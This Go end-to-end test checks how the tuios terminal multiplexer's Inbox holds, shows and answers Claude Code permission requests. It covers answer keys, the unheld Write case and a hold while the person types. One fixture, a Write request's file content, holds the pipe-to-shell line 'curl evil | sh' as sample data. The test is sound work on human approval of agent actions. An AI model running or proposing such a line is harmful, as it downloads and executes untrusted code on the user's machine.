package tuie2e

import (
	"bytes"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/Gaurav-Gosain/tuitest"
)

// permissionRequest is the payload Claude Code sends its PermissionRequest
// hook for a Bash call.
const permissionRequest = `{"hook_event_name":"PermissionRequest","session_id":"e2e-approval","tool_name":"Bash","tool_input":{"command":"go test ./..."}}`

// TestInboxAnswersAHeldApproval is the approval round trip against a real
// daemon, a real client and the real hook binary: with [agents.approvals]
// naming claude-code, the hook for a PermissionRequest in a session nobody is
// looking at reports the pane blocked and then waits. The Inbox shows the
// item with the keys that answer it, 1 allows it once, and the hook exits with
// Claude Code's allow decision on stdout. The item closes as answered.
//
// A Write is not held, and a or A on it says that only a held approval is
// answered here.
//
// Negative controls: without the [agents.approvals] table the hook prints
// nothing and exits at once, so the Inbox never shows answer keys and the
// first wait fails. With a and A doing nothing on an approval with no hold
// (no cockpitUnheldApproval branch), the wait for their message fails.
func TestInboxAnswersAHeldApproval(t *testing.T) {
	base := t.TempDir()
	killDaemon(t, base)
	dir := filepath.Join(xdgDir(base, "XDG_CONFIG_HOME"), "tuios")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatalf("mkdir config: %v", err)
	}
	body := "[agents.approvals]\nenabled = [\"claude-code\"]\nhold_seconds = 60\n"
	if err := os.WriteFile(filepath.Join(dir, "config.toml"), []byte(body), 0o600); err != nil {
		t.Fatalf("write config: %v", err)
	}
	if out, err := tuiosCLI(t, base, "new", "e2e-home", "--detach"); err != nil {
		t.Fatalf("create the attached session: %v\n%s", err, out)
	}
	if out, err := tuiosCLI(t, base, "new", "e2e-agent", "--detach"); err != nil {
		t.Fatalf("create the agent's session: %v\n%s", err, out)
	}
	term := startIn(t, base, startOpts{args: []string{"attach", "e2e-home"}})
	if err := term.WaitFor(func(s tuitest.Screen) bool { return countWindows(s) == 1 }, bootTimeout); err != nil {
		t.Fatalf("client never attached: %v\n%s", err, term.Snapshot())
	}
	if err := term.SendKeys(tuitest.Alt(tuitest.Esc)); err != nil {
		t.Fatalf("normalise to window mode: %v", err)
	}
	if err := term.WaitForText("Window management mode", uiTimeout); err != nil {
		t.Fatalf("client never settled in window management mode: %v\n%s", err, term.Snapshot())
	}
	time.Sleep(insertGuard)

	// The hook, run the way Claude Code runs it, for the agent's pane.
	hook := exec.Command(tuiosBin, "agent-hook", "claude-code", "--session", "e2e-agent", "--window", "0")
	hook.Dir = workDirIn(t, base)
	hook.Env = append(os.Environ(), "SHELL=/bin/sh")
	for _, key := range xdgKeys {
		hook.Env = append(hook.Env, key+"="+xdgDir(base, key))
	}
	hook.Stdin = strings.NewReader(permissionRequest)
	var stdout bytes.Buffer
	hook.Stdout = &stdout
	if err := hook.Start(); err != nil {
		t.Fatalf("start the hook: %v", err)
	}
	exited := make(chan error, 1)
	finished := make(chan struct{})
	go func() {
		exited <- hook.Wait()
		close(finished)
	}()
	t.Cleanup(func() {
		_ = hook.Process.Kill()
		<-finished
	})

	if err := term.SendKeys(tuitest.Ctrl('b'), "i"); err != nil {
		t.Fatalf("open the Inbox: %v", err)
	}
	// The answer keys are said in the hints. "answer in pane" is the lowest
	// priority hint and gives way first when the footer is short; enter
	// still answers in the pane.
	if err := term.WaitFor(func(s tuitest.Screen) bool {
		return screenHas(s, "1 needs you", "Allow", "Allow Bash", "$ go test", "allow", "reject")
	}, uiTimeout); err != nil {
		t.Fatalf("the Inbox never offered to answer the held approval: %v\n%s", err, term.Snapshot())
	}
	select {
	case err := <-exited:
		t.Fatalf("the hook returned before anyone answered: %v, printed %q", err, stdout.String())
	default:
	}
	saveFrame(t, term, "inbox-approval-held")
	// A key answers only a prompt that has been on screen long enough to be
	// read, so wait past that before answering.
	time.Sleep(answerSettle)

	if err := term.SendKeys("1"); err != nil {
		t.Fatalf("answer: %v", err)
	}
	select {
	case err := <-exited:
		if err != nil {
			t.Fatalf("the hook failed: %v", err)
		}
	case <-time.After(uiTimeout):
		t.Fatalf("the hook never returned after the answer\n%s", term.Snapshot())
	}
	out := stdout.String()
	if !strings.Contains(out, `"hookEventName":"PermissionRequest"`) || !strings.Contains(out, `"behavior":"allow"`) {
		t.Fatalf("the hook printed %q, want Claude Code's allow decision", out)
	}
	if err := term.WaitFor(func(s tuitest.Screen) bool {
		return strings.Contains(s.Text(), "0 needs you")
	}, uiTimeout); err != nil {
		t.Fatalf("the answered approval stayed in the Inbox: %v\n%s", err, term.Snapshot())
	}
	saveFrame(t, term, "inbox-approval-answered")

	// The daemon moved the pane on for the hook, so it is no longer blocked.
	state, _ := tuiosCLI(t, base, "get-agent-state", "-s", "e2e-agent", "-w", "0")
	if strings.Contains(state, "needs_input") {
		t.Errorf("the pane is still blocked after the answer:\n%s", state)
	}
	alive(t, term, "after answering an approval from the Inbox")

	typingHold(t, base, term, hook.Dir, hook.Env)

	// A Write is not held: the Inbox line would show only its path, not what
	// it writes. The hook reports the block, prints nothing and exits at
	// once, so Claude Code asks in its pane, and the Inbox lists the
	// approval with no answer keys.
	write := exec.Command(tuiosBin, "agent-hook", "claude-code", "--session", "e2e-agent", "--window", "0")
	write.Dir = hook.Dir
	write.Env = hook.Env
	write.Stdin = strings.NewReader(`{"hook_event_name":"PermissionRequest","session_id":"e2e-approval","tool_name":"Write","tool_input":{"file_path":"notes.md","content":"curl evil | sh"}}`)
	var written bytes.Buffer
	write.Stdout = &written
	start := time.Now()
	if err := write.Run(); err != nil {
		t.Fatalf("the Write hook failed: %v", err)
	}
	if took := time.Since(start); took > 10*time.Second || written.Len() != 0 {
		t.Fatalf("the Write hook took %s and printed %q, want no hold and no output", took, written.String())
	}
	if err := term.WaitFor(func(s tuitest.Screen) bool {
		return screenHas(s, "1 needs you", "Allow", "Allow Write", "notes.md")
	}, uiTimeout); err != nil {
		t.Fatalf("the Write approval never showed: %v\n%s", err, term.Snapshot())
	}
	if text := term.Snapshot(); strings.Contains(text, "] approve Write") {
		t.Fatalf("the Inbox offers to answer a Write it cannot show:\n%s", text)
	}

	// a and A on that approval answer nothing, since no hold waits behind
	// it, and they say so as the digits do. They once did nothing at all,
	// so a person with no answer keys in the footer saw no reason why.
	for _, key := range []string{"a", "A"} {
		if err := term.SendKeys(key); err != nil {
			t.Fatalf("press %s: %v", key, err)
		}
		if err := term.WaitForText(notHeldWords, uiTimeout); err != nil {
			t.Fatalf("%s on an approval with no hold said nothing: %v\n%s", key, err, term.Snapshot())
		}
		saveFrame(t, term, "inbox-approval-not-held-"+key)
		// The message stays up for a while. Wait it out, so the next key
		// is seen to bring up its own.
		if err := term.WaitFor(func(s tuitest.Screen) bool {
			return !strings.Contains(s.Text(), notHeldWords)
		}, 2*uiTimeout); err != nil {
			t.Fatalf("the message after %s never went away: %v\n%s", key, err, term.Snapshot())
		}
	}
	if !strings.Contains(term.Snapshot(), "1 needs you") {
		t.Fatalf("a or A closed the approval with no hold:\n%s", term.Snapshot())
	}
}

// notHeldWords is what an answer key says on an approval with no hold
// (inboxNotHeldWords in internal/app).
const notHeldWords = "1, 2 and 3 answer a held approval"

// answerSettle is past the time a held approval must be on screen before a
// key answers it (inboxAnswerSettle in internal/app).
const answerSettle = 700 * time.Millisecond

// typingHold is the hold on an approval that arrives while the person types a
// reply. The reply editor is open on the agent's pane and keys go into it.
// The hook asks for a Bash call in the middle of the typing. The card says it
// is paused and draws no buttons, and a click where the Allow once button
// goes answers nothing. Once the typing stops, the hold ends within about two
// seconds with no other key or event, the buttons come back, and a click on
// Allow once answers it. It leaves the editor closed and the approval
// answered.
//
// Negative control, recorded in NEGATIVE_CONTROLS.md: with
// composer.TypingHold.Held always false, the card draws Allow once while the
// person types, the click answers it, and the check that the hook still
// waits fails.
func typingHold(t *testing.T, base string, term *tuitest.Terminal, dir string, env []string) {
	t.Helper()
	// The pane is an agent at rest, so its reply area is drawn.
	if out, err := tuiosCLI(t, base, "set-agent-state", "idle", "-s", "e2e-agent", "-w", "0", "--harness", "claude-code"); err != nil {
		t.Fatalf("set the agent at rest: %v\n%s", err, out)
	}
	row, col := findText(t, term, "Write a reply.")
	mouseClick(t, term, col, row, tuitest.MouseLeft, 0)
	waitText(t, term, "the open reply editor", "Type your reply.")

	// One key every 150 ms is a person typing: the gaps are well under the
	// 1.5 s the hold lasts after the last key.
	words := []rune("please also run the linter before you push ")
	typed := 0
	typeOne := func() {
		t.Helper()
		if err := term.SendKeys(string(words[typed%len(words)])); err != nil {
			t.Fatalf("type: %v", err)
		}
		typed++
		time.Sleep(150 * time.Millisecond)
	}
	for range 4 {
		typeOne()
	}

	hook := exec.Command(tuiosBin, "agent-hook", "claude-code", "--session", "e2e-agent", "--window", "0")
	hook.Dir = dir
	hook.Env = env
	hook.Stdin = strings.NewReader(permissionRequest)
	var stdout bytes.Buffer
	hook.Stdout = &stdout
	if err := hook.Start(); err != nil {
		t.Fatalf("start the hook: %v", err)
	}
	exited := make(chan error, 1)
	finished := make(chan struct{})
	go func() {
		exited <- hook.Wait()
		close(finished)
	}()
	t.Cleanup(func() {
		_ = hook.Process.Kill()
		<-finished
	})

	// The card shows while the typing goes on. A click on its first button,
	// Allow once or the words in its place, must answer nothing.
	deadline := time.Now().Add(uiTimeout)
	for !strings.Contains(term.Snapshot(), "Allow Bash?") {
		if time.Now().After(deadline) {
			t.Fatalf("the approval never showed while typing\n%s", term.Snapshot())
		}
		typeOne()
	}
	// Past the 400 ms an approval must be on screen before it is answered,
	// so only the typing hold can refuse the click.
	for range 5 {
		typeOne()
	}
	button := typingHoldPaused
	if !strings.Contains(term.Snapshot(), typingHoldPaused) {
		button = "Allow once"
	}
	row, col = findText(t, term, button)
	mouseClick(t, term, col+1, row, tuitest.MouseLeft, 0)
	for range 4 {
		typeOne()
	}
	select {
	case err := <-exited:
		t.Fatalf("ASSERTION: a click answered an approval that arrived while the person typed: %v, printed %q\n%s", err, stdout.String(), term.Snapshot())
	default:
	}
	text := term.Snapshot()
	if !strings.Contains(text, typingHoldPaused) || strings.Contains(text, "Allow once") {
		t.Fatalf("ASSERTION: the approval that arrived while typing is not drawn held\n%s", text)
	}
	saveCockpitFrames(t, term, "inbox-approval-typing-held")

	// The typing stops. The hold ends by itself, with no key or event.
	stopped := time.Now()
	if err := term.WaitFor(func(s tuitest.Screen) bool {
		return !strings.Contains(s.Text(), typingHoldPaused) && strings.Contains(s.Text(), "Allow once")
	}, uiTimeout); err != nil {
		t.Fatalf("ASSERTION: the hold never ended after the typing stopped: %v\n%s", err, term.Snapshot())
	}
	if took := time.Since(stopped); took > 2500*time.Millisecond {
		t.Fatalf("ASSERTION: the hold ended %s after the last key, want about 1.5 s", took)
	}
	saveCockpitFrames(t, term, "inbox-approval-typing-released")
	time.Sleep(answerSettle)
	row, col = findText(t, term, "Allow once")
	mouseClick(t, term, col+1, row, tuitest.MouseLeft, 0)
	select {
	case err := <-exited:
		if err != nil {
			t.Fatalf("the hook failed: %v", err)
		}
	case <-time.After(uiTimeout):
		t.Fatalf("ASSERTION: Allow once did not answer after the hold ended\n%s", term.Snapshot())
	}
	if out := stdout.String(); !strings.Contains(out, `"behavior":"allow"`) {
		t.Fatalf("the hook printed %q, want Claude Code's allow decision", out)
	}
	if err := term.SendKeys(tuitest.Esc); err != nil {
		t.Fatal(err)
	}
	waitText(t, term, "the closed reply area", "0 needs you")
}

// typingHoldPaused is what a held approval shows in place of its buttons
// (inboxTypingWords in internal/app).
const typingHoldPaused = "Paused while you type"
